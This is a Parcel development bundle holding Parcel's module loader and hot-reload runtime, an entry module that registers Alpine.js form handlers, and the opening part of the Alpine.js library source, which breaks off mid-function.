// modules are defined as an array
// [ module function, map of requires ]
//
// map of requires is short require name -> numeric require
//
// anything defined in a previous bundle is accessed via the
// orig method which is the require for previous bundles

(function (modules, entry, mainEntry, parcelRequireName, globalName) {
  /* eslint-disable no-undef */
  var globalObject =
    typeof globalThis !== 'undefined'
      ? globalThis
      : typeof self !== 'undefined'
      ? self
      : typeof window !== 'undefined'
      ? window
      : typeof global !== 'undefined'
      ? global
      : {};
  /* eslint-enable no-undef */

  // Save the require from previous bundle to this closure if any
  var previousRequire =
    typeof globalObject[parcelRequireName] === 'function' &&
    globalObject[parcelRequireName];

  var cache = previousRequire.cache || {};
  // Do not use `require` to prevent Webpack from trying to bundle this call
  var nodeRequire =
    typeof module !== 'undefined' &&
    typeof module.require === 'function' &&
    module.require.bind(module);

  function newRequire(name, jumped) {
    if (!cache[name]) {
      if (!modules[name]) {
        // if we cannot find the module within our internal map or
        // cache jump to the current global require ie. the last bundle
        // that was added to the page.
        var currentRequire =
          typeof globalObject[parcelRequireName] === 'function' &&
          globalObject[parcelRequireName];
        if (!jumped && currentRequire) {
          return currentRequire(name, true);
        }

        // If there are other bundles on this page the require from the
        // previous one is saved to 'previousRequire'. Repeat this as
        // many times as there are bundles until the module is found or
        // we exhaust the require chain.
        if (previousRequire) {
          return previousRequire(name, true);
        }

        // Try the node require function if it exists.
        if (nodeRequire && typeof name === 'string') {
          return nodeRequire(name);
        }

        var err = new Error("Cannot find module '" + name + "'");
        err.code = 'MODULE_NOT_FOUND';
        throw err;
      }

      localRequire.resolve = resolve;
      localRequire.cache = {};

      var module = (cache[name] = new newRequire.Module(name));

      modules[name][0].call(
        module.exports,
        localRequire,
        module,
        module.exports,
        this
      );
    }

    return cache[name].exports;

    function localRequire(x) {
      var res = localRequire.resolve(x);
      return res === false ? {} : newRequire(res);
    }

    function resolve(x) {
      var id = modules[name][1][x];
      return id != null ? id : x;
    }
  }

  function Module(moduleName) {
    this.id = moduleName;
    this.bundle = newRequire;
    this.exports = {};
  }

  newRequire.isParcelRequire = true;
  newRequire.Module = Module;
  newRequire.modules = modules;
  newRequire.cache = cache;
  newRequire.parent = previousRequire;
  newRequire.register = function (id, exports) {
    modules[id] = [
      function (require, module) {
        module.exports = exports;
      },
      {},
    ];
  };

  Object.defineProperty(newRequire, 'root', {
    get: function () {
      return globalObject[parcelRequireName];
    },
  });

  globalObject[parcelRequireName] = newRequire;

  for (var i = 0; i < entry.length; i++) {
    newRequire(entry[i]);
  }

  if (mainEntry) {
    // Expose entry point to Node, AMD or browser globals
    // Based on https://github.com/ForbesLindesay/umd/blob/master/template.js
    var mainExports = newRequire(mainEntry);

    // CommonJS
    if (typeof exports === 'object' && typeof module !== 'undefined') {
      module.exports = mainExports;

      // RequireJS
    } else if (typeof define === 'function' && define.amd) {
      define(function () {
        return mainExports;
      });

      // <script>
    } else if (globalName) {
      this[globalName] = mainExports;
    }
  }
})({"8gSz4":[function(require,module,exports) {
var global = arguments[3];
var HMR_HOST = null;
var HMR_PORT = 34915;
var HMR_SECURE = false;
var HMR_ENV_HASH = "d6ea1d42532a7575";
var HMR_USE_SSE = false;
module.bundle.HMR_BUNDLE_ID = "8406c229ef8962ed";
"use strict";
/* global HMR_HOST, HMR_PORT, HMR_ENV_HASH, HMR_SECURE, HMR_USE_SSE, chrome, browser, __parcel__import__, __parcel__importScripts__, ServiceWorkerGlobalScope */ /*::
import type {
  HMRAsset,
  HMRMessage,
} from '@parcel/reporter-dev-server/src/HMRServer.js';
interface ParcelRequire {
  (string): mixed;
  cache: {|[string]: ParcelModule|};
  hotData: {|[string]: mixed|};
  Module: any;
  parent: ?ParcelRequire;
  isParcelRequire: true;
  modules: {|[string]: [Function, {|[string]: string|}]|};
  HMR_BUNDLE_ID: string;
  root: ParcelRequire;
}
interface ParcelModule {
  hot: {|
    data: mixed,
    accept(cb: (Function) => void): void,
    dispose(cb: (mixed) => void): void,
    // accept(deps: Array<string> | string, cb: (Function) => void): void,
    // decline(): void,
    _acceptCallbacks: Array<(Function) => void>,
    _disposeCallbacks: Array<(mixed) => void>,
  |};
}
interface ExtensionContext {
  runtime: {|
    reload(): void,
    getURL(url: string): string;
    getManifest(): {manifest_version: number, ...};
  |};
}
declare var module: {bundle: ParcelRequire, ...};
declare var HMR_HOST: string;
declare var HMR_PORT: string;
declare var HMR_ENV_HASH: string;
declare var HMR_SECURE: boolean;
declare var HMR_USE_SSE: boolean;
declare var chrome: ExtensionContext;
declare var browser: ExtensionContext;
declare var __parcel__import__: (string) => Promise<void>;
declare var __parcel__importScripts__: (string) => Promise<void>;
declare var globalThis: typeof self;
declare var ServiceWorkerGlobalScope: Object;
*/ var OVERLAY_ID = "__parcel__error__overlay__";
var OldModule = module.bundle.Module;
function Module(moduleName) {
    OldModule.call(this, moduleName);
    this.hot = {
        data: module.bundle.hotData[moduleName],
        _acceptCallbacks: [],
        _disposeCallbacks: [],
        accept: function(fn) {
            this._acceptCallbacks.push(fn || function() {});
        },
        dispose: function(fn) {
            this._disposeCallbacks.push(fn);
        }
    };
    module.bundle.hotData[moduleName] = undefined;
}
module.bundle.Module = Module;
module.bundle.hotData = {};
var checkedAssets /*: {|[string]: boolean|} */ , assetsToDispose /*: Array<[ParcelRequire, string]> */ , assetsToAccept /*: Array<[ParcelRequire, string]> */ ;
function getHostname() {
    return HMR_HOST || (location.protocol.indexOf("http") === 0 ? location.hostname : "localhost");
}
function getPort() {
    return HMR_PORT || location.port;
}
// eslint-disable-next-line no-redeclare
var parent = module.bundle.parent;
if ((!parent || !parent.isParcelRequire) && typeof WebSocket !== "undefined") {
    var hostname = getHostname();
    var port = getPort();
    var protocol = HMR_SECURE || location.protocol == "https:" && ![
        "localhost",
        "127.0.0.1",
        "0.0.0.0"
    ].includes(hostname) ? "wss" : "ws";
    var ws;
    if (HMR_USE_SSE) ws = new EventSource("/__parcel_hmr");
    else try {
        ws = new WebSocket(protocol + "://" + hostname + (port ? ":" + port : "") + "/");
    } catch (err) {
        if (err.message) console.error(err.message);
        ws = {};
    }
    // Web extension context
    var extCtx = typeof browser === "undefined" ? typeof chrome === "undefined" ? null : chrome : browser;
    // Safari doesn't support sourceURL in error stacks.
    // eval may also be disabled via CSP, so do a quick check.
    var supportsSourceURL = false;
    try {
        (0, eval)('throw new Error("test"); //# sourceURL=test.js');
    } catch (err) {
        supportsSourceURL = err.stack.includes("test.js");
    }
    // $FlowFixMe
    ws.onmessage = async function(event /*: {data: string, ...} */ ) {
        checkedAssets = {} /*: {|[string]: boolean|} */ ;
        assetsToAccept = [];
        assetsToDispose = [];
        var data /*: HMRMessage */  = JSON.parse(event.data);
        if (data.type === "update") {
            // Remove error overlay if there is one
            if (typeof document !== "undefined") removeErrorOverlay();
            let assets = data.assets.filter((asset)=>asset.envHash === HMR_ENV_HASH);
            // Handle HMR Update
            let handled = assets.every((asset)=>{
                return asset.type === "css" || asset.type === "js" && hmrAcceptCheck(module.bundle.root, asset.id, asset.depsByBundle);
            });
            if (handled) {
                console.clear();
                // Dispatch custom event so other runtimes (e.g React Refresh) are aware.
                if (typeof window !== "undefined" && typeof CustomEvent !== "undefined") window.dispatchEvent(new CustomEvent("parcelhmraccept"));
                await hmrApplyUpdates(assets);
                // Dispose all old assets.
                let processedAssets = {} /*: {|[string]: boolean|} */ ;
                for(let i = 0; i < assetsToDispose.length; i++){
                    let id = assetsToDispose[i][1];
                    if (!processedAssets[id]) {
                        hmrDispose(assetsToDispose[i][0], id);
                        processedAssets[id] = true;
                    }
                }
                // Run accept callbacks. This will also re-execute other disposed assets in topological order.
                processedAssets = {};
                for(let i = 0; i < assetsToAccept.length; i++){
                    let id = assetsToAccept[i][1];
                    if (!processedAssets[id]) {
                        hmrAccept(assetsToAccept[i][0], id);
                        processedAssets[id] = true;
                    }
                }
            } else fullReload();
        }
        if (data.type === "error") {
            // Log parcel errors to console
            for (let ansiDiagnostic of data.diagnostics.ansi){
                let stack = ansiDiagnostic.codeframe ? ansiDiagnostic.codeframe : ansiDiagnostic.stack;
                console.error("\uD83D\uDEA8 [parcel]: " + ansiDiagnostic.message + "\n" + stack + "\n\n" + ansiDiagnostic.hints.join("\n"));
            }
            if (typeof document !== "undefined") {
                // Render the fancy html overlay
                removeErrorOverlay();
                var overlay = createErrorOverlay(data.diagnostics.html);
                // $FlowFixMe
                document.body.appendChild(overlay);
            }
        }
    };
    if (ws instanceof WebSocket) {
        ws.onerror = function(e) {
            if (e.message) console.error(e.message);
        };
        ws.onclose = function() {
            console.warn("[parcel] \uD83D\uDEA8 Connection to the HMR server was lost");
        };
    }
}
function removeErrorOverlay() {
    var overlay = document.getElementById(OVERLAY_ID);
    if (overlay) {
        overlay.remove();
        console.log("[parcel] \u2728 Error resolved");
    }
}
function createErrorOverlay(diagnostics) {
    var overlay = document.createElement("div");
    overlay.id = OVERLAY_ID;
    let errorHTML = '<div style="background: black; opacity: 0.85; font-size: 16px; color: white; position: fixed; height: 100%; width: 100%; top: 0px; left: 0px; padding: 30px; font-family: Menlo, Consolas, monospace; z-index: 9999;">';
    for (let diagnostic of diagnostics){
        let stack = diagnostic.frames.length ? diagnostic.frames.reduce((p, frame)=>{
            return `${p}
<a href="/__parcel_launch_editor?file=${encodeURIComponent(frame.location)}" style="text-decoration: underline; color: #888" onclick="fetch(this.href); return false">${frame.location}</a>
${frame.code}`;
        }, "") : diagnostic.stack;
        errorHTML += `
      <div>
        <div style="font-size: 18px; font-weight: bold; margin-top: 20px;">
          \u{1F6A8} ${diagnostic.message}
        </div>
        <pre>${stack}</pre>
        <div>
          ${diagnostic.hints.map((hint)=>"<div>\uD83D\uDCA1 " + hint + "</div>").join("")}
        </div>
        ${diagnostic.documentation ? `<div>\u{1F4DD} <a style="color: violet" href="${diagnostic.documentation}" target="_blank">Learn more</a></div>` : ""}
      </div>
    `;
    }
    errorHTML += "</div>";
    overlay.innerHTML = errorHTML;
    return overlay;
}
function fullReload() {
    if ("reload" in location) location.reload();
    else if (extCtx && extCtx.runtime && extCtx.runtime.reload) extCtx.runtime.reload();
}
function getParents(bundle, id) /*: Array<[ParcelRequire, string]> */ {
    var modules = bundle.modules;
    if (!modules) return [];
    var parents = [];
    var k, d, dep;
    for(k in modules)for(d in modules[k][1]){
        dep = modules[k][1][d];
        if (dep === id || Array.isArray(dep) && dep[dep.length - 1] === id) parents.push([
            bundle,
            k
        ]);
    }
    if (bundle.parent) parents = parents.concat(getParents(bundle.parent, id));
    return parents;
}
function updateLink(link) {
    var href = link.getAttribute("href");
    if (!href) return;
    var newLink = link.cloneNode();
    newLink.onload = function() {
        if (link.parentNode !== null) // $FlowFixMe
        link.parentNode.removeChild(link);
    };
    newLink.setAttribute("href", // $FlowFixMe
    href.split("?")[0] + "?" + Date.now());
    // $FlowFixMe
    link.parentNode.insertBefore(newLink, link.nextSibling);
}
var cssTimeout = null;
function reloadCSS() {
    if (cssTimeout) return;
    cssTimeout = setTimeout(function() {
        var links = document.querySelectorAll('link[rel="stylesheet"]');
        for(var i = 0; i < links.length; i++){
            // $FlowFixMe[incompatible-type]
            var href /*: string */  = links[i].getAttribute("href");
            var hostname = getHostname();
            var servedFromHMRServer = hostname === "localhost" ? new RegExp("^(https?:\\/\\/(0.0.0.0|127.0.0.1)|localhost):" + getPort()).test(href) : href.indexOf(hostname + ":" + getPort());
            var absolute = /^https?:\/\//i.test(href) && href.indexOf(location.origin) !== 0 && !servedFromHMRServer;
            if (!absolute) updateLink(links[i]);
        }
        cssTimeout = null;
    }, 50);
}
function hmrDownload(asset) {
    if (asset.type === "js") {
        if (typeof document !== "undefined") {
            let script = document.createElement("script");
            script.src = asset.url + "?t=" + Date.now();
            if (asset.outputFormat === "esmodule") script.type = "module";
            return new Promise((resolve, reject)=>{
                var _document$head;
                script.onload = ()=>resolve(script);
                script.onerror = reject;
                (_document$head = document.head) === null || _document$head === void 0 || _document$head.appendChild(script);
            });
        } else if (typeof importScripts === "function") {
            // Worker scripts
            if (asset.outputFormat === "esmodule") return import(asset.url + "?t=" + Date.now());
            else return new Promise((resolve, reject)=>{
                try {
                    importScripts(asset.url + "?t=" + Date.now());
                    resolve();
                } catch (err) {
                    reject(err);
                }
            });
        }
    }
}
async function hmrApplyUpdates(assets) {
    global.parcelHotUpdate = Object.create(null);
    let scriptsToRemove;
    try {
        // If sourceURL comments aren't supported in eval, we need to load
        // the update from the dev server over HTTP so that stack traces
        // are correct in errors/logs. This is much slower than eval, so
        // we only do it if needed (currently just Safari).
        // https://bugs.webkit.org/show_bug.cgi?id=137297
        // This path is also taken if a CSP disallows eval.
        if (!supportsSourceURL) {
            let promises = assets.map((asset)=>{
                var _hmrDownload;
                return (_hmrDownload = hmrDownload(asset)) === null || _hmrDownload === void 0 ? void 0 : _hmrDownload.catch((err)=>{
                    // Web extension fix
                    if (extCtx && extCtx.runtime && extCtx.runtime.getManifest().manifest_version == 3 && typeof ServiceWorkerGlobalScope != "undefined" && global instanceof ServiceWorkerGlobalScope) {
                        extCtx.runtime.reload();
                        return;
                    }
                    throw err;
                });
            });
            scriptsToRemove = await Promise.all(promises);
        }
        assets.forEach(function(asset) {
            hmrApply(module.bundle.root, asset);
        });
    } finally{
        delete global.parcelHotUpdate;
        if (scriptsToRemove) scriptsToRemove.forEach((script)=>{
            if (script) {
                var _document$head2;
                (_document$head2 = document.head) === null || _document$head2 === void 0 || _document$head2.removeChild(script);
            }
        });
    }
}
function hmrApply(bundle /*: ParcelRequire */ , asset /*:  HMRAsset */ ) {
    var modules = bundle.modules;
    if (!modules) return;
    if (asset.type === "css") reloadCSS();
    else if (asset.type === "js") {
        let deps = asset.depsByBundle[bundle.HMR_BUNDLE_ID];
        if (deps) {
            if (modules[asset.id]) {
                // Remove dependencies that are removed and will become orphaned.
                // This is necessary so that if the asset is added back again, the cache is gone, and we prevent a full page reload.
                let oldDeps = modules[asset.id][1];
                for(let dep in oldDeps)if (!deps[dep] || deps[dep] !== oldDeps[dep]) {
                    let id = oldDeps[dep];
                    let parents = getParents(module.bundle.root, id);
                    if (parents.length === 1) hmrDelete(module.bundle.root, id);
                }
            }
            if (supportsSourceURL) // Global eval. We would use `new Function` here but browser
            // support for source maps is better with eval.
            (0, eval)(asset.output);
            // $FlowFixMe
            let fn = global.parcelHotUpdate[asset.id];
            modules[asset.id] = [
                fn,
                deps
            ];
        } else if (bundle.parent) hmrApply(bundle.parent, asset);
    }
}
function hmrDelete(bundle, id) {
    let modules = bundle.modules;
    if (!modules) return;
    if (modules[id]) {
        // Collect dependencies that will become orphaned when this module is deleted.
        let deps = modules[id][1];
        let orphans = [];
        for(let dep in deps){
            let parents = getParents(module.bundle.root, deps[dep]);
            if (parents.length === 1) orphans.push(deps[dep]);
        }
        // Delete the module. This must be done before deleting dependencies in case of circular dependencies.
        delete modules[id];
        delete bundle.cache[id];
        // Now delete the orphans.
        orphans.forEach((id)=>{
            hmrDelete(module.bundle.root, id);
        });
    } else if (bundle.parent) hmrDelete(bundle.parent, id);
}
function hmrAcceptCheck(bundle /*: ParcelRequire */ , id /*: string */ , depsByBundle /*: ?{ [string]: { [string]: string } }*/ ) {
    if (hmrAcceptCheckOne(bundle, id, depsByBundle)) return true;
    // Traverse parents breadth first. All possible ancestries must accept the HMR update, or we'll reload.
    let parents = getParents(module.bundle.root, id);
    let accepted = false;
    while(parents.length > 0){
        let v = parents.shift();
        let a = hmrAcceptCheckOne(v[0], v[1], null);
        if (a) // If this parent accepts, stop traversing upward, but still consider siblings.
        accepted = true;
        else {
            // Otherwise, queue the parents in the next level upward.
            let p = getParents(module.bundle.root, v[1]);
            if (p.length === 0) {
                // If there are no parents, then we've reached an entry without accepting. Reload.
                accepted = false;
                break;
            }
            parents.push(...p);
        }
    }
    return accepted;
}
function hmrAcceptCheckOne(bundle /*: ParcelRequire */ , id /*: string */ , depsByBundle /*: ?{ [string]: { [string]: string } }*/ ) {
    var modules = bundle.modules;
    if (!modules) return;
    if (depsByBundle && !depsByBundle[bundle.HMR_BUNDLE_ID]) {
        // If we reached the root bundle without finding where the asset should go,
        // there's nothing to do. Mark as "accepted" so we don't reload the page.
        if (!bundle.parent) return true;
        return hmrAcceptCheck(bundle.parent, id, depsByBundle);
    }
    if (checkedAssets[id]) return true;
    checkedAssets[id] = true;
    var cached = bundle.cache[id];
    assetsToDispose.push([
        bundle,
        id
    ]);
    if (!cached || cached.hot && cached.hot._acceptCallbacks.length) {
        assetsToAccept.push([
            bundle,
            id
        ]);
        return true;
    }
}
function hmrDispose(bundle /*: ParcelRequire */ , id /*: string */ ) {
    var cached = bundle.cache[id];
    bundle.hotData[id] = {};
    if (cached && cached.hot) cached.hot.data = bundle.hotData[id];
    if (cached && cached.hot && cached.hot._disposeCallbacks.length) cached.hot._disposeCallbacks.forEach(function(cb) {
        cb(bundle.hotData[id]);
    });
    delete bundle.cache[id];
}
function hmrAccept(bundle /*: ParcelRequire */ , id /*: string */ ) {
    // Execute the module.
    bundle(id);
    // Run the accept callbacks in the new version of the module.
    var cached = bundle.cache[id];
    if (cached && cached.hot && cached.hot._acceptCallbacks.length) cached.hot._acceptCallbacks.forEach(function(cb) {
        var assetsToAlsoAccept = cb(function() {
            return getParents(module.bundle.root, id);
        });
        if (assetsToAlsoAccept && assetsToAccept.length) {
            assetsToAlsoAccept.forEach(function(a) {
                hmrDispose(a[0], a[1]);
            });
            // $FlowFixMe[method-unbinding]
            assetsToAccept.push.apply(assetsToAccept, assetsToAlsoAccept);
        }
    });
}

},{}],"fyuRC":[function(require,module,exports) {
var parcelHelpers = require("@parcel/transformer-js/src/esmodule-helpers.js");
var _alpinejs = require("alpinejs");
var _alpinejsDefault = parcelHelpers.interopDefault(_alpinejs);
var _profile = require("./profile");
var _publicForm = require("./public-form");
if (module.hot) module.hot.accept();
(0, _alpinejsDefault.default).data("profileFormHandler", (0, _profile.profileFormHandler));
(0, _alpinejsDefault.default).data("formHandler", (0, _publicForm.formHandler));
(0, _alpinejsDefault.default).start();

},{"alpinejs":"69hXP","./profile":"1MUGo","./public-form":"ax8Y7","@parcel/transformer-js/src/esmodule-helpers.js":"dIQaP"}],"69hXP":[function(require,module,exports) {
// packages/alpinejs/src/scheduler.js
var parcelHelpers = require("@parcel/transformer-js/src/esmodule-helpers.js");
parcelHelpers.defineInteropFlag(exports);
parcelHelpers.export(exports, "Alpine", ()=>src_default);
parcelHelpers.export(exports, "default", ()=>module_default);
var flushPending = false;
var flushing = false;
var queue = [];
var lastFlushedIndex = -1;
function scheduler(callback) {
    queueJob(callback);
}
function queueJob(job) {
    if (!queue.includes(job)) queue.push(job);
    queueFlush();
}
function dequeueJob(job) {
    let index = queue.indexOf(job);
    if (index !== -1 && index > lastFlushedIndex) queue.splice(index, 1);
}
function queueFlush() {
    if (!flushing && !flushPending) {
        flushPending = true;
        queueMicrotask(flushJobs);
    }
}
function flushJobs() {
    flushPending = false;
    flushing = true;
    for(let i = 0; i < queue.length; i++){
        queue[i]();
        lastFlushedIndex = i;
    }
    queue.length = 0;
    lastFlushedIndex = -1;
    flushing = false;
}
// packages/alpinejs/src/reactivity.js
var reactive;
var effect;
var release;
var raw;
var shouldSchedule = true;
function disableEffectScheduling(callback) {
    shouldSchedule = false;
    callback();
    shouldSchedule = true;
}
function setReactivityEngine(engine) {
    reactive = engine.reactive;
    release = engine.release;
    effect = (callback)=>engine.effect(callback, {
            scheduler: (task)=>{
                if (shouldSchedule) scheduler(task);
                else task();
            }
        });
    raw = engine.raw;
}
function overrideEffect(override) {
    effect = override;
}
function elementBoundEffect(el) {
    let cleanup2 = ()=>{};
    let wrappedEffect = (callback)=>{
        let effectReference = effect(callback);
        if (!el._x_effects) {
            el._x_effects = /* @__PURE__ */ new Set();
            el._x_runEffects = ()=>{
                el._x_effects.forEach((i)=>i());
            };
        }
        el._x_effects.add(effectReference);
        cleanup2 = ()=>{
            if (effectReference === void 0) return;
            el._x_effects.delete(effectReference);
            release(effectReference);
        };
        return effectReference;
    };
    return [
        wrappedEffect,
        ()=>{
            cleanup2();
        }
    ];
}
function watch(getter, callback) {
    let firstTime = true;
    let oldValue;
    let effectReference = effect(()=>{
        let value = getter();
        JSON.stringify(value);
        if (!firstTime) queueMicrotask(()=>{
            callback(value, oldValue);
            oldValue = value;
        });
        else oldValue = value;
        firstTime = false;
    });
    return ()=>release(effectReference);
}
// packages/alpinejs/src/mutation.js
var onAttributeAddeds = [];
var onElRemoveds = [];
var onElAddeds = [];
function onElAdded(callback) {
    onElAddeds.push(callback);
}
function onElRemoved(el, callback) {
    if (typeof callback === "function") {
        if (!el._x_cleanups) el._x_cleanups = [];
        el._x_cleanups.push(callback);
    } else {
        callback = el;
        onElRemoveds.push(callback);
    }
}
function onAttributesAdded(callback) {
    onAttributeAddeds.push(callback);
}
function onAttributeRemoved(el, name, callback) {
    if (!el._x_attributeCleanups) el._x_attributeCleanups = {};
    if (!el._x_attributeCleanups[name]) el._x_attributeCleanups[name] = [];
    el._x_attributeCleanups[name].push(callback);
}
function cleanupAttributes(el, names) {
    if (!el._x_attributeCleanups) return;
    Object.entries(el._x_attributeCleanups).forEach(([name, value])=>{
        if (names === void 0 || names.includes(name)) {
            value.forEach((i)=>i());
            delete el._x_attributeCleanups[name];
        }
    });
}
function cleanupElement(el) {
    el._x_effects?.forEach(dequeueJob);
    while(el._x_cleanups?.length)el._x_cleanups.pop()();
}
var observer = new MutationObserver(onMutate);
var currentlyObserving = false;
function startObservingMutations() {
    observer.observe(document, {
        subtree: true,
        childList: true,
        attributes: true,
        attributeOldValue: true
    });
    currentlyObserving = true;
}
function stopObservingMutations() {
    flushObserver();
    observer.disconnect();
    currentlyObserving = false;
}
var queuedMutations = [];
function flushObserver() {
    let records = observer.takeRecords();
    queuedMutations.push(()=>records.length > 0 && onMutate(records));
    let queueLengthWhenTriggered = queuedMutations.length;
    queueMicrotask(()=>{
        if (queuedMutations.length === queueLengthWhenTriggered) while(queuedMutations.length > 0)queuedMutations.shift()();
    });
}
function mutateDom(callback) {
    if (!currentlyObserving) return callback();
    stopObservingMutations();
    let result = callback();
    startObservingMutations();
    return result;
}
var isCollecting = false;
var deferredMutations = [];
function deferMutations() {
    isCollecting = true;
}
function flushAndStopDeferringMutations() {
    isCollecting = false;
    onMutate(deferredMutations);
    deferredMutations = [];
}
function onMutate(mutations) {
    if (isCollecting) {
        deferredMutations = deferredMutations.concat(mutations);
        return;
    }
    let addedNodes = /* @__PURE__ */ new Set();
    let removedNodes = /* @__PURE__ */ new Set();
    let addedAttributes = /* @__PURE__ */ new Map();
    let removedAttributes = /* @__PURE__ */ new Map();
    for(let i = 0; i < mutations.length; i++){
        if (mutations[i].target._x_ignoreMutationObserver) continue;
        if (mutations[i].type === "childList") {
            mutations[i].addedNodes.forEach((node)=>node.nodeType === 1 && addedNodes.add(node));
            mutations[i].removedNodes.forEach((node)=>node.nodeType === 1 && removedNodes.add(node));
        }
        if (mutations[i].type === "attributes") {
            let el = mutations[i].target;
            let name = mutations[i].attributeName;
            let oldValue = mutations[i].oldValue;
            let add2 = ()=>{
                if (!addedAttributes.has(el)) addedAttributes.set(el, []);
                addedAttributes.get(el).push({
                    name,
                    value: el.getAttribute(name)
                });
            };
            let remove = ()=>{
                if (!removedAttributes.has(el)) removedAttributes.set(el, []);
                removedAttributes.get(el).push(name);
            };
            if (el.hasAttribute(name) && oldValue === null) add2();
            else if (el.hasAttribute(name)) {
                remove();
                add2();
            } else remove();
        }
    }
    removedAttributes.forEach((attrs, el)=>{
        cleanupAttributes(el, attrs);
    });
    addedAttributes.forEach((attrs, el)=>{
        onAttributeAddeds.forEach((i)=>i(el, attrs));
    });
    for (let node of removedNodes){
        if (addedNodes.has(node)) continue;
        onElRemoveds.forEach((i)=>i(node));
    }
    addedNodes.forEach((node)=>{
        node._x_ignoreSelf = true;
        node._x_ignore = true;
    });
    for (let node of addedNodes){
        if (removedNodes.has(node)) continue;
        if (!node.isConnected) continue;
        delete node._x_ignoreSelf;
        delete node._x_ignore;
        onElAddeds.forEach((i)=>i(node));
        node._x_ignore = true;
        node._x_ignoreSelf = true;
    }
    addedNodes.forEach((node)=>{
        delete node._x_ignoreSelf;
        delete node._x_ignore;
    });
    addedNodes = null;
    removedNodes = null;
    addedAttributes = null;
    removedAttributes = null;
}
// packages/alpinejs/src/scope.js
function scope(node) {
    return mergeProxies(closestDataStack(node));
}
function addScopeToNode(node, data2, referenceNode) {
    node._x_dataStack = [
        data2,
        ...closestDataStack(referenceNode || node)
    ];
    return ()=>{
        node._x_dataStack = node._x_dataStack.filter((i)=>i !== data2);
    };
}
function closestDataStack(node) {
    if (node._x_dataStack) return node._x_dataStack;
    if (typeof ShadowRoot === "function" && node instanceof ShadowRoot) return closestDataStack(node.host);
    if (!node.parentNode) return [];
    return closestDataStack(node.parentNode);
}
function mergeProxies(objects) {
    return new Proxy({
        objects
    }, mergeProxyTrap);
}
var mergeProxyTrap = {
    ownKeys ({ objects }) {
        return Array.from(new Set(objects.flatMap((i)=>Object.keys(i))));
    },
    has ({ objects }, name) {
        if (name == Symbol.unscopables) return false;
        return objects.some((obj)=>Object.prototype.hasOwnProperty.call(obj, name) || Reflect.has(obj, name));
    },
    get ({ objects }, name, thisProxy) {
        if (name == "toJSON") return collapseProxies;
        return Reflect.get(objects.find((obj)=>Reflect.has(obj, name)) || {}, name, thisProxy);
    },
    set ({ objects }, name, value, thisProxy) {
        const target = objects.find((obj)=>Object.prototype.hasOwnProperty.call(obj, name)) || objects[objects.length - 1];
        const descriptor = Object.getOwnPropertyDescriptor(target, name);
        if (descriptor?.set && descriptor?.get) return descriptor.set.call(thisProxy, value) || true;
        return Reflect.set(target, name, value);
    }
};
function collapseProxies() {
    let keys = Reflect.ownKeys(this);
    return keys.reduce((acc, key)=>{
        acc[key] = Reflect.get(this, key);
        return acc;
    }, {});
}
// packages/alpinejs/src/interceptor.js
function initInterceptors(data2) {
    let isObject2 = (val)=>typeof val === "object" && !Array.isArray(val) && val !== null;
    let recurse = (obj, basePath = "")=>{
        Object.entries(Object.getOwnPropertyDescriptors(obj)).forEach(([key, { value, enumerable }])=>{
            if (enumerable === false || value === void 0) return;
            if (typeof value === "object" && value !== null && value.__v_skip) return;
            let path = basePath === "" ? key : `${basePath}.${key}`;
            if (typeof value === "object" && value !== null && value._x_interceptor) obj[key] = value.initialize(data2, path, key);
            else if (isObject2(value) && value !== obj && !(value instanceof Element)) recurse(value, path);
        });
    };
    return recurse(data2);
}
function interceptor(callback, mutateObj = ()=>{}) {
    let obj = {
        initialValue: void 0,
        _x_interceptor: true,
        initialize (data2, path, key) {
            return callback(this.initialValue, ()=>get(data2, path), (value)=>set(data2, path, value), path, key);
        }
    };
    mutateObj(obj);
    return (initialValue)=>{
        if (typeof initialValue === "object" && initialValue !== null && initialValue._x_interceptor) {
            let initialize = obj.initialize.bind(obj);
            obj.initialize = (data2, path, key)=>{
                let innerValue = initialValue.initialize(data2, path, key);
                obj.initialValue = innerValue;
                return initialize(data2, path, key);
            };
        } else obj.initialValue = initialValue;
        return obj;
    };
}
function get(obj, path) {
    return path.split(".").reduce((carry, segment)=>carry[segment], obj);
}
function set(obj, path, value) {
    if (typeof path === "string") path = path.split(".");
    if (path.length === 1) obj[path[0]] = value;
    else if (path.length === 0) throw error;
    else {
        if (obj[path[0]]) return set(obj[path[0]], path.slice(1), value);
        else {
            obj[path[0]] = {};
            return set(obj[path[0]], path.slice(1), value);
        }
    }
}
// packages/alpinejs/src/magics.js
var magics = {};
function magic(name, callback) {
    magics[name] = callback;
}
function injectMagics(obj, el) {
    let memoizedUtilities = getUtilities(el);
    Object.entries(magics).forEach(([name, callback])=>{
        Object.defineProperty(obj, `$${name}`, {
            get () {
                return callback(el, memoizedUtilities);
            },
            enumerable: false
        });
    });
    return obj;
}
function getUtilities(el) {
    let [utilities, cleanup2] = getElementBoundUtilities(el);
    let utils = {
        interceptor,
        ...utilities
    };
    onElRemoved(el, cleanup2);
    return utils;
}
// packages/alpinejs/src/utils/error.js
function tryCatch(el, expression, callback, ...args) {
    try {
        return callback(...args);
    } catch (e) {
        handleError(e, el, expression);
    }
}
function handleError(error2, el, expression) {
    error2 = Object.assign(error2 ?? {
        message: "No error message given."
    }, {
        el,
        expression
    });
    console.warn(`Alpine Expression Error: ${error2.message}

${expression ? 'Expression: "' + expression + '"\n\n' : ""}`, el);
    setTimeout(()=>{
        throw error2;
    }, 0);
}
// packages/alpinejs/src/evaluator.js
var shouldAutoEvaluateFunctions = true;
function dontAutoEvaluateFunctions(callback) {
    let cache = shouldAutoEvaluateFunctions;
    shouldAutoEvaluateFunctions = false;
    let result = callback();
    shouldAutoEvaluateFunctions = cache;
    return result;
}
function evaluate(el, expression, extras = {}) {
    let result;
    evaluateLater(el, expression)((value)=>result = value, extras);
    return result;
}
function evaluateLater(...args) {
    return theEvaluatorFunction(...args);
}
var theEvaluatorFunction = normalEvaluator;
function setEvaluator(newEvaluator) {
    theEvaluatorFunction = newEvaluator;
}
function normalEvaluator(el, expression) {
    let overriddenMagics = {};
    injectMagics(overriddenMagics, el);
    let dataStack = [
        overriddenMagics,
        ...closestDataStack(el)
    ];
    let evaluator = typeof expression === "function" ? generateEvaluatorFromFunction(dataStack, expression) : generateEvaluatorFromString(dataStack, expression, el);
    return tryCatch.bind(null, el, expression, evaluator);
}
function generateEvaluatorFromFunction(dataStack, func) {
    return (receiver = ()=>{}, { scope: scope2 = {}, params = [] } = {})=>{
        let result = func.apply(mergeProxies([
            scope2,
            ...dataStack
        ]), params);
        runIfTypeOfFunction(receiver, result);
    };
}
var evaluatorMemo = {};
function generateFunctionFromString(expression, el) {
    if (evaluatorMemo[expression]) return evaluatorMemo[expression];
